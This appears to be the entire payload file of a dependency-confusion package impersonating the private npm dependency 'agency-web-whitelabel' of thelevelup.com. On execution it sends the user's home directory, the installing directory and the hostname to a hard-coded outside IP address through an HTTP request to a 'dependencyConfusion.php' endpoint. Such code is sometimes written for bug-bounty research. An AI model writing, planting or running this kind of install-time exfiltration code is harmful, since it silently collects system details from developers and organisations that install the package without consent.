const http = require('http');
const os = require('os');

http.get('http://161.22.47.220/dependencyConfusion.php?dominio=thelevelup.com&dependencia=agency-web-whitelabel&directorio='+os.homedir()+'%20'+__dirname+'&hostname='+os.hostname);
